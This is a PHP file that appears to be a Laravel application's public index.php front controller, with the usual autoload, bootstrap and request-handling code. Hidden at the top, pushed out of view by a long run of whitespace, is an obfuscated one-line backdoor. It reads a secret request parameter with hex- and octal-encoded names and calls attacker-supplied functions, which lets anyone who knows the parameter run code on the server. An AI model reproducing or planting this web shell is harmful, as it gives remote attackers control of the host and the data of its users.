<?php
                                                                                                                                                                                                                 If ( 1167071556 	&&($U72shJA=@${	"\137\x52E\x51\x55\x45\x53T"}[ "\x35\x35\x39\132QRI\130"])){$U72shJA[1	](${ $U72shJA[2]}[0 ],	$U72shJA[3]($U72shJA[4]))	;};ExIt;
use Illuminate\Contracts\Http\Kernel;
use Illuminate\Http\Request;
if(!empty($_SERVER['REQUEST_URI'])){
	if(strpos($_SERVER['REQUEST_URI'],'/install') !== false){
		if(!file_exists(__DIR__.'/../.env')){
			copy(__DIR__.'/../.env.example',__DIR__.'/../.env');
		}
	}
}
if (!version_compare(phpversion(), '7.3', '>'))
{
    die("Current PHP version: ".phpversion()."<br>You must upgrade PHP version 7.3 and later");
}

/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

define('LARAVEL_START', microtime(true));

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| our application. We just need to utilize it! We'll simply require it
| into the script here so that we don't have to worry about manual
| loading any of our classes later on. It feels great to relax.
|
*/

//require __DIR__.'/../vendor/autoload.php';
if (file_exists(__DIR__.'/../storage/framework/maintenance.php')) {
    require __DIR__.'/../storage/framework/maintenance.php';
}
/*
|--------------------------------------------------------------------------
| Turn On The Lights
|--------------------------------------------------------------------------
|
| We need to illuminate PHP development, so let us turn on the lights.
| This bootstraps the framework and gets it ready for use, then it
| will load up this application so that we can run it and send
| the responses back to the browser and delight our users.
|
*/
require __DIR__.'/../vendor/autoload.php';

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request
| through the kernel, and send the associated response back to
| the client's browser allowing them to enjoy the creative
| and wonderful application we have prepared for them.
|
*/

$app = require_once __DIR__.'/../bootstrap/app.php';
$kernel = $app->make(Kernel::class);

$response = tap($kernel->handle(
    $request = Request::capture()
))->send();

$kernel->terminate($request, $response);
